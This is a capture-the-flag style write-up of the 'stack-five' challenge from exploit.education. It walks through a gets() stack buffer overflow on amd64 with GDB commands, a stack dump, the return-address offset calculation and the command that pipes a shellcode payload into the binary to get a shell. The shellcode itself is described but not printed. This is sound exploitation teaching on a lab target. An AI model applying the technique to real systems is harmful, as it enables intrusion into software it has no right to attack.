# STACK-FIVE
## Solution writeup

The source code for this challenge is given as:
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

This challenge is the first real example of shellcode being injected via buffer overflow. 
There are several difficulties with this one, but I'll go through it step by step.

Firstly, I'll be opening GDB differently. This is to ensure that the state of the stack is 
as deterministic as possible:

    env - /usr/local/bin/gdb /opt/phoenix/amd64/stack-five

I'm also using full filepaths in order to maintain as much determinism as possible. 

With GDB open, the first thing I do is list all currently set environment variables:

    show env

This reveals that GDB has set 2 environment variables at launch, LINES and COLUMNS. Unset them 
like so:

    unset env LINES
    unset env COLUMNS

Next, I list the functions:

    info functions

Then I dissassemble main:

    disas main

It reveals that start_level is called at main + 30, and therefore the return address saved will be 
main + 30, or 0x4005c7. This will be important soon.

Next I dissassemble start_level:

    disas start_level

'get' is called at start_level + 15, so setting a breakpoint at start_level + 20 (next instruction) 
will let us inspect the state of the stack immediately after gets is called. 

    b *start_level + 20

I run the program and throw in a few 'A's. Inspecting the stack with:

    x/64xw $rsp

Reveals the stack:
```
0x7fffffffed40: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffed50: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffed60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffed70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffed80: 0x41414141      0x41414141      0x00004141      0x00007fff
0x7fffffffed90: 0xf7ffb300      0x00007fff      0x00000000      0x0a000000
0x7fffffffeda0: 0xf7ffb300      0x00007fff      0xf7db9934      0x00007fff
0x7fffffffedb0: 0xffffee38      0x00007fff      0xffffede0      0x00007fff
0x7fffffffedc0: 0xffffede0      0x00007fff      0x004005c7      0x00000000
0x7fffffffedd0: 0xffffee38      0x00007fff      0x00000000      0x00000001
0x7fffffffede0: 0x00000001      0x00000000      0xf7d8fd62      0x00007fff
0x7fffffffedf0: 0x00000000      0x00000000      0xffffee30      0x00007fff
0x7fffffffee00: 0x00000000      0x00000000      0xf7ffdbc8      0x00007fff
0x7fffffffee10: 0x00003e00      0x04000001      0x00400459      0x00000000
0x7fffffffee20: 0x00000000      0x00000000      0x00400436      0x00000000
0x7fffffffee30: 0x00000001      0x00000000      0xffffefa5      0x00007fff
```
We can see our 'A's on the stack, as well as where the return address is saved. We can calculate the 
offset like so:

    printf "%i\n", 0x7fffffffedc0-0x7fffffffed40

This reveals that the offset is 136. Using this information I can formulate my payload. I get some 
shellcode from online that executes a simple shell, and create a ruby script that crafts the payload 
complete with NOP padding and a NOP sled. At the end I append "0x7fffffffed50". This will overwrite 
the saved return address and will cause the instruction pointer to point near the middle of the NOP 
sled. 

The execution of the exploit is then given:

    (ruby exploit.rb; cat) | env - /opt/phoenix/amd64/stack-five

The reason for (ruby exploit.rb; cat) is that, by default, piping from one command to another 
will cause stdin to close. In this case, it will also close our shell. Appending an extra 'cat' will 
keep stdin open. I also use 'env -' to make the stack as close as possible to what it was in the 
debugging session. 

### Addendum
This challenge more than the others will require a bit of trial and error, as the exact values you 
encounter will likely be different. One useful bit of information here when something doesn't work 
is to verify your shellcode is even being reached, and you can do this with '0xCC', which is an 
opcode that causes a SIGTRAP, otherwise known as a breakpoint or debug trap. Replace your shellcode 
with a bunch of these and verify that it is even being reached. 

